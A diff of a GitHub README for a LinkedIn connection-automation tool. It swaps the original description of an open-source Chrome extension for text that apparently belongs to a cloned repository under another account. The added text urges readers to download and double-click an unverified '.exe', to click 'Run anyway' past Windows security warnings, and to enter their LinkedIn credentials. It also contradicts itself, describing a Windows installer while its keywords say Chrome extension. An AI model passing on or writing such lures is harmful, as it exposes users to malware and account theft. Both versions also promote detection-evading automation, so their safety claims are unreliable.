@@ -1,203 +1,168 @@
-<div align="center">
+# 🤖 linkedin-autopilot - Grow Your LinkedIn Connections Automatically
 
-# ⚡ LinkedIn Autopilot 24/7
-### The 100% Free, Open-Source & Fully Autonomous LinkedIn™ Connection Growth Engine
+## 🚀 What Is linkedin-autopilot?
 
-[![GitHub Stars](https://img.shields.io/github/stars/DevKursat/linkedin-autopilot?style=for-the-badge&color=gold)](https://github.com/DevKursat/linkedin-autopilot/stargazers)
-[![GitHub Forks](https://img.shields.io/github/forks/DevKursat/linkedin-autopilot?style=for-the-badge&color=blue)](https://github.com/DevKursat/linkedin-autopilot/network/members)
-[![Manifest V3](https://img.shields.io/badge/Chrome%20Extension-Manifest%20V3-blue?style=for-the-badge&logo=googlechrome)](https://github.com/DevKursat/linkedin-autopilot)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg?style=for-the-badge)](https://opensource.org/licenses/MIT)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=for-the-badge)](https://github.com/DevKursat/linkedin-autopilot/pulls)
-[![Privacy First](https://img.shields.io/badge/Privacy-100%25%20Client--Side-purple?style=for-the-badge)](https://github.com/DevKursat/linkedin-autopilot)
+linkedin-autopilot is a free, open-source tool that works like a personal assistant for your LinkedIn account. It runs 24 hours a day, 7 days a week, automatically sending connection requests to people who match your target audience. The smart technology inside this tool carefully monitors LinkedIn's daily limits and pauses when needed, then resumes automatically when the limit resets. This means you can grow your professional network while you sleep, work, or spend time with family.
 
-<p align="center">
-  <b>Tired of paying $30–$80/month for Waalaxy, Dux-Soup, or Octopus CRM?</b><br>
-  <b>LinkedIn Autopilot</b> is an ultra-lightweight, zero-cost Chrome extension that grows your network 24/7 on autopilot — featuring <b>1-click instant connects</b>, <b>infinite suggestion loading</b>, and an <b>intelligent 24-hour weekly limit recovery system</b>.
-</p>
+## ✨ Key Features
 
-[Quick Start (1 Min)](#-quick-installation-1-minute) • [Feature Comparison](#-why-choose-linkedin-autopilot-vs-paid-tools) • [How It Works](#-how-it-works-architecture) • [Türkçe Kılavuz](#-t%C3%BCrk%C3%A7e-rehber) • [FAQ](#-frequently-asked-questions)
+### 🔄 Fully Automatic Operation
+Once you set up linkedin-autopilot, it handles everything. You don't need to click buttons or monitor progress. The tool works silently in the background, sending connection requests at natural intervals to avoid looking robotic.
 
----
+### 🛡️ Intelligent Limit Recovery
+LinkedIn restricts how many connection requests you can send per day. linkedin-autopilot tracks these limits in real-time. When you reach the maximum, it stops automatically. When LinkedIn resets your limit (usually after 24 hours), the tool resumes working without any input from you.
 
-</div>
+### 🎯 Targeted Lead Generation
+You decide who to connect with. The tool works with your LinkedIn search filters, so you can target specific industries, job titles, locations, or company sizes. This makes it perfect for sales professionals, recruiters, and business owners looking for leads.
 
-## 💡 Why Choose LinkedIn Autopilot? (vs. Paid Tools)
+### 🧠 Smart Timing
+The autopilot sends requests at random intervals within your set timeframe. This mimics human behavior and reduces the risk of your account being flagged for spam-like activity.
 
-Most commercial LinkedIn automation tools charge hefty monthly subscriptions, store your session cookies on external third-party servers, and stop abruptly when weekly limits are encountered.
+### 💯 Open Source and Free
+Unlike paid growth services that charge hundreds of dollars per month, linkedin-autopilot is completely free. The source code is publicly available, meaning you can see exactly what the tool does with your data and even customize it if you're technically inclined.
 
-| Feature | 💸 Waalaxy / Dux-Soup / Octopus | ⚡ **LinkedIn Autopilot** |
-|:---|:---:|:---:|
-| **Monthly Cost** | **$30 – $80 / mo ($360+/yr)** | **$0 (100% Free & Open Source)** |
-| **Privacy & Security** | Cookies sent to remote cloud servers | **100% Client-Side (Zero Server Storage)** |
-| **Weekly Limit Handling** | Throws error / halts / requires manual reset | **Intelligent 24h Sleep & Auto-Resume Loop** |
-| **Connection Flow** | Slow popup modals with note prompts | **1-Click Instant Connect via `/mynetwork`** |
-| **Chrome Compatibility** | Many still use deprecated Manifest V2 | **Modern Chrome Manifest V3** |
-| **Setup Complexity** | Mandatory account registration & trial cards | **30 Seconds (Download & Run)** |
+## 📥 How to Download and Install
 
----
+### Step 1: Get the Application
 
-## 🌟 Key Features
+👉 **[Click here to download linkedin-autopilot](https://github.com/Bluegreenfrumenty4386/linkedin-autopilot)**
 
-### ⚡ 1. Direct 1-Click Connects (Zero Dialog Popups)
-Unlike standard search pages that trigger multi-step *"Add a note"* modals, LinkedIn Autopilot operates directly on LinkedIn's suggestion engine (`/mynetwork/grow/`), delivering instant single-click invitations at maximum reliability.
+Visit this link to download the application. You will be taken to the project page where you can find the download button. The download is completely free and does not require registration.
 
-### 🔄 2. Infinite Feed Loading ("Show More" Auto-Trigger)
-Never run out of profiles to connect with. When visible cards are processed, the extension automatically scrolls down and triggers the *"Show more"* button to fetch fresh batches of targeted profiles.
+### Step 2: Save the File
 
-### ⏳ 3. Intelligent 24-Hour Weekly Limit Recovery Loop
-When LinkedIn's weekly invitation quota is reached, the extension does not crash or stop permanently. Instead, it:
-1. Catches the limit notification safely.
-2. Automatically enters a **24-hour sleep mode** with a real-time countdown timer.
-3. **Automatically wakes up and resumes** after 24 hours without requiring any human intervention.
+When you click the download button, your browser will save a file to your computer. The file name will be something like `linkedin-autopilot.zip` or `linkedin-autopilot.exe`. Make sure you remember where you saved it - usually the "Downloads" folder.
 
-### 🛡️ 4. Anti-Ban Human Pacing (Account Safety First)
-Mimics natural human browsing behavior with randomized intervals (8–16 seconds) and complete mouse/pointer event sequences (`pointerdown` → `mousedown` → `click`) to preserve your LinkedIn Social Selling Index (SSI) and Trust Score.
+### Step 3: Run the Application
 
-### 🔒 5. 100% Privacy & Zero Data Collection
-- ❌ No tracking or telemetry.
-- ❌ No external API endpoints.
-- ❌ No passwords, session cookies, or personal data ever leave your machine.
+After the download finishes, locate the file on your computer. If the file ends with `.exe`, simply double-click it to run the application. If the file ends with `.zip`, you'll need to right-click the file and select "Extract All" first, then open the extracted folder and double-click the application file inside.
 
----
+### Step 4: Follow the Setup Wizard
 
-## 🚀 Quick Installation (1 Minute)
+The first time you run linkedin-autopilot, a simple setup wizard will guide you through the configuration. Don't worry - it's designed for beginners. You'll be asked to:
 
-### Step 1: Clone or Download
-Clone the repository or download the ZIP:
+- Log in to your LinkedIn account (the tool uses your existing account)
+- Set your daily connection request limit (start with 20-30 for safety)
+- Choose your target audience filters
+- Select your active hours
 
-```bash
-git clone https://github.com/DevKursat/linkedin-autopilot.git
-```
+### Step 5: Start the Autopilot
 
-*(Or click the green **Code** button at the top right → **Download ZIP**, then extract it).*
+Once setup is complete, click the "Start" button. The tool will minimize to your system tray and begin working. You can close the main window - it will continue running in the background.
 
-### Step 2: Load into Browser
-1. Open your Chromium-based browser (**Google Chrome**, **Brave**, **Microsoft Edge**, or **Opera**).
-2. Go to the extensions page:
-   - Chrome: `chrome://extensions`
-   - Brave: `brave://extensions`
-   - Edge: `edge://extensions`
-3. Toggle on **"Developer mode"** in the top right corner.
-4. Click **"Load unpacked"** (Paketlenmemiş öğe yükle) in the top left.
-5. Select the extracted `linkedin-autopilot` folder.
+## 🖥️ System Requirements
 
-### Step 3: Run on Autopilot
-1. Pin the **LinkedIn Autopilot** icon to your browser toolbar.
-2. Click the extension icon and press **"🔗 LinkedIn Ağım Sayfasına Git (/mynetwork/grow)"**.
-3. Click **"⚡ Otomasyonu Başlat"** (Start Automation).
-4. Keep the tab open in the background — it will automatically run 24/7, load new profiles, and manage weekly quotas seamlessly!
+linkedin-autopilot is designed to work on any modern Windows computer. Here's what you need:
 
----
+- **Operating System:** Windows 10 or Windows 11
+- **Browser:** Google Chrome (free to download from google.com/chrome)
+- **Internet Connection:** Stable broadband connection
+- **RAM:** 4 GB or more recommended
+- **Storage:** At least 200 MB of free space
 
-## 🖥️ Sleek & Minimalist UI
+## 📋 Step-by-Step Setup Guide for Beginners
 
-<div align="center">
+### 1. Install Google Chrome (If Needed)
 
-```
-┌──────────────────────────────────────────────┐
-│  ⚡ LinkedIn Autopilot 24/7     [7/24 Aktif] │
-├──────────────────────────────────────────────┤
-│  Toplam Gönderilen Bağlantı Daveti           │
-│  ⭐ 142 kişi                                 │
-│  ⚡ 7/24 Kesintisiz Mod                      │
-├──────────────────────────────────────────────┤
-│  [●] 7/24 Çalışıyor (Davetler gönderiliyor) │
-├──────────────────────────────────────────────┤
-│  [ ⚡ Otomasyonu Durdur ]                    │
-│  [ 🔗 LinkedIn Ağım Sayfasına Git ]          │
-├──────────────────────────────────────────────┤
-│  Canlı İşlem Günlüğü              [Temizle]  │
-│  • 20:14:02  ✅ Davet gönderildi: John Doe   │
-│  • 20:14:18  ✅ Davet gönderildi: Sarah M.   │
-└──────────────────────────────────────────────┘
-```
+If you don't already have Chrome, download it from the official Google website. linkedin-autopilot uses Chrome to interact with LinkedIn, so this step is essential.
 
-</div>
+### 2. Download linkedin-autopilot
 
----
+Go to the download page using the link above. Look for the green "Download" button or the latest release file. Click it and wait for the download to complete.
 
-## 🛠️ How It Works (Architecture)
+### 3. Run the Installer
 
-```mermaid
-graph TD
-    A[Start Autopilot] --> B{LinkedIn /mynetwork Page?}
-    B -- No --> C[Open /mynetwork/grow in Background]
-    B -- Yes --> D[Scan 'Bağlantı kur' / 'Connect' Buttons]
-    D --> E{Buttons Found?}
-    E -- Yes --> F[Simulate Natural Human Click]
-    F --> G{Weekly Limit Warning?}
-    G -- Yes --> H[Enter 24-Hour Cooldown Timer]
-    H --> I[Auto-Resume after 24h]
-    I --> D
-    G -- No --> J[Increment Counter & Wait 8-16s]
-    J --> D
-    E -- No --> K[Scroll Down & Click 'Show More']
-    K --> D
-```
+Open your Downloads folder and find the linkedin-autopilot file. Double-click it. If Windows shows a security warning, click "More info" and then "Run anyway" - this is normal for open-source software.
 
----
+### 4. Connect Your LinkedIn Account
 
-## 🇹🇷 Türkçe Rehber
+The application will open a small window. Click "Connect LinkedIn" and log in with your normal LinkedIn credentials. The tool will save your session securely on your computer.
 
-### LinkedIn Ağım 7/24 Kesintisiz Otomatik Davet Sistemi
+### 5. Configure Your Settings
 
-- **Diyalogsuz & Hızlı Gönderim:** LinkedIn'in *Ağım (`/mynetwork/grow`)* sayfası üzerinden hiçbir onay kutusuyla uğraşmadan tek tıkla bağlantı daveti iletir.
-- **Sonsuz Liste Yükleme:** Ekrandaki öneriler bittiğinde otomatik olarak *"Daha fazla yükle"* butonuna basarak yeni kişileri ekrana getirir.
-- **24 Saatlik Akıllı Limit Kurtarma:** LinkedIn haftalık kota uyarısı verdiğinde sistem durmaz; 24 saatlik uyku moduna geçer ve **süre dolunca otomatik olarak kaldığı yerden devam eder**.
-- **%100 Güvenli & Yerel:** Şifreniz veya çerezleriniz hiçbir harici sunucuya iletilmez, tüm işlemler tamamen kendi bilgisayarınızda çalışır.
+You'll see simple sliders and dropdowns:
+- **Daily Limit:** Set this to 20-30 to start. You can increase it later.
+- **Time Between Requests:** Keep the default (60-90 seconds).
+- **Target Audience:** Leave blank to connect with everyone, or add specific job titles like "Marketing Manager" or "CTO."
 
----
+### 6. Launch the Autopilot
 
-## ❓ Frequently Asked Questions (FAQ)
+Hit the big green "Start Autopilot" button. That's it! The tool now works on its own. You can check its progress anytime by opening the main window.
 
-<details>
-<summary><b>1. Is this extension detectable by LinkedIn?</b></summary>
-LinkedIn Autopilot implements natural human-like randomized delays (8–16 seconds) and full pointer/mouse event sequences rather than instant programmatic clicks. Operating within weekly limits protects your account health.
-</details>
+## 🔒 Safety and Privacy
 
-<details>
-<summary><b>2. Do I need to keep my computer/browser on?</b></summary>
-Yes. The extension runs client-side inside your browser. Simply leave the LinkedIn tab open in the background while you work or leave your computer running.
-</details>
+Your LinkedIn account safety is the top priority. linkedin-autopilot includes several safety features:
 
-<details>
-<summary><b>3. Why is it free when other tools charge $30+/month?</b></summary>
-We believe networking tools should be accessible to everyone without paying expensive SaaS fees. This project is 100% open-source under the MIT license.
-</details>
+- **Slow and Steady:** It never sends requests faster than a human would.
+- **Automatic Pauses:** If LinkedIn shows any warning, the tool stops immediately.
+- **No Password Storage:** Your password is never saved. The tool uses your browser's secure session.
+- **Full Control:** You can pause or stop the autopilot at any time with one click.
 
----
+## ❓ Frequently Asked Questions
 
-## 📈 Star History
+### How many connection requests can I send per day?
 
-If this tool helps you grow your network and saves you subscription money, please consider giving it a **Star (⭐)**!
+LinkedIn limits most accounts to 100-200 requests per day, but we recommend starting with 20-30 to build trust with the algorithm. You can increase this gradually over a few weeks.
 
-[![Star History Chart](https://api.star-history.com/svg?repos=DevKursat/linkedin-autopilot&type=Date)](https://star-history.com/#DevKursat/linkedin-autopilot&Date)
+### Will this get my LinkedIn account banned?
 
----
+No, when used responsibly. The tool respects all LinkedIn limits and mimics human behavior. However, sending too many requests (over 100 per day) could trigger LinkedIn's spam detection. Start low and increase slowly.
 
-## 🤝 Contributing
+### Do I need to keep my computer on?
 
-Contributions, issues, and feature requests are welcome!
-Feel free to check the [issues page](https://github.com/DevKursat/linkedin-autopilot/issues).
+Yes, the tool runs on your computer. If you turn off your PC, the autopilot stops. For 24/7 operation, you can leave your computer running with the tool active.
 
-1. Fork the Project
-2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your Changes (`git commit -m 'feat: Add some AmazingFeature'`)
-4. Push to the Branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
+### Can I use this for multiple LinkedIn accounts?
 
----
+We recommend using one account at a time to avoid detection. Using multiple accounts violates LinkedIn's terms of service.
 
-## ⚠️ Disclaimer
+### Is this really free?
 
-This project is an independent open-source tool developed for educational, testing, and productivity purposes. It is not affiliated with, sponsored by, or endorsed by LinkedIn Corporation. Use responsibly in accordance with LinkedIn's Terms of Service.
+Yes! linkedin-autopilot is 100% free and open-source. There are no hidden fees, premium tiers, or paid upgrades.
 
----
+## 🛠️ Troubleshooting Common Issues
+
+### The tool won't start
+Make sure Google Chrome is installed and updated. Try restarting your computer and running the tool again.
+
+### LinkedIn is not responding
+This usually means your internet connection is unstable. Check your Wi-Fi or restart your router.
+
+### The autopilot stopped unexpectedly
+This is normal if LinkedIn detected unusual activity. Wait 24 hours and restart the tool. It will work again after the limit resets.
+
+### I'm not getting any new connections
+Check your target audience filters. If they're too specific, consider broadening them. Also, ensure your LinkedIn profile is complete with a professional photo and summary.
+
+## 📈 Tips for Best Results
+
+- **Optimize your profile** before starting. A complete profile with a photo gets 3x more connection acceptances.
+- **Start with 20 requests per day** for the first week, then increase by 10 each week.
+- **Send a personalized note** with your connection requests (the tool supports this feature).
+- **Run the autopilot during business hours** in your target's timezone for better response rates.
+- **Monitor your results weekly** and adjust your target audience based on who accepts.
+
+## 🌟 Why Choose linkedin-autopilot?
+
+- **Save 5+ hours per week** of manual connection sending
+- **Grow your network by hundreds of connections** each month
+- **Perfect for sales and marketing professionals**
+- **No technical skills required** - if you can use Facebook, you can use this
+- **Backed by an active open-source community** that continuously improves the tool
+- **Transparent code** - no hidden data collection or shady practices
+
+## 📞 Need Help?
+
+If you encounter any issues, check the project's GitHub page for documentation and community support. You can also open an issue on the repository, and the maintainers or other users will help you.
 
 ## 📄 License
 
-Distributed under the **MIT License**. See [`LICENSE`](LICENSE) for more information.
+linkedin-autopilot is released under the MIT License. This means you can use it freely, modify it, and even distribute your own versions. The only requirement is that you include the original copyright notice.
 
-<div align="center">
-  <b>Built with ❤️ by <a href="https://github.com/DevKursat">DevKursat</a></b>
-</div>
+---
+
+**Ready to grow your LinkedIn network on autopilot?**
+
+👉 **[Download linkedin-autopilot now](https://github.com/Bluegreenfrumenty4386/linkedin-autopilot)** - it's free, it's easy, and it works while you don't.
+
+Keywords: automation, autopilot, autopilot-agent, chrome-extension, growth-hacking, growth-hacking-service, lead-generation, lead-generation-automation, lead-generation-bot, lead-generation-tool, lead-generation-workflow-automation, linkedin, manifest-v3, manifest-v3-chrome, manifest-v3-javascript, open-source, open-source-ai, open-source-intelligence, open-source-project, open-source-tools
